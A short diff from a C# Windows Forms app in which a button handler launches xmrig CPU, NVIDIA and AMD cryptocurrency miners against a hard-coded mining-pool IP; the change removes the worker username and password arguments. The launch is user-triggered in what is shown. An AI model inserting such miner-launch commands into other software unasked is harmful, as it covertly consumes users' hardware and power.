@@ -71,9 +71,9 @@ namespace WindowsFormsApp1
 
         private void button1_Click(object sender, EventArgs e)
         {
-            string cmd = "start C:\\PMApp\\xmrig\\xmrig-cpu.exe -a cryptonight -o stratum+tcp://213.5.31.38:8888 -u tarzans.93602 -p x --donate-level=1";
-            string cmd2 = "start C:\\PMApp\\xmrig-nvidia-261\\xmrig-nvidia.exe -a cryptonight -o stratum+tcp://213.5.31.38:8888 -u tarzans.93602 -p x --donate-level=1";
-            string cmd3 = "start C:\\PMApp\\xmrig-amd-271\\xmrig-amd.exe -a cryptonight -o stratum+tcp://213.5.31.38:8888 -u tarzans.93602 -p x --donate-level=1";
+            string cmd = "start C:\\PMApp\\xmrig\\xmrig-cpu.exe -a cryptonight -o stratum+tcp://213.5.31.38:8888 --donate-level=1";
+            string cmd2 = "start C:\\PMApp\\xmrig-nvidia-261\\xmrig-nvidia.exe -a cryptonight -o stratum+tcp://213.5.31.38:8888 --donate-level=1";
+            string cmd3 = "start C:\\PMApp\\xmrig-amd-271\\xmrig-amd.exe -a cryptonight -o stratum+tcp://213.5.31.38:8888 --donate-level=1";
             var proc = new ProcessStartInfo()
             {
                 UseShellExecute = true,
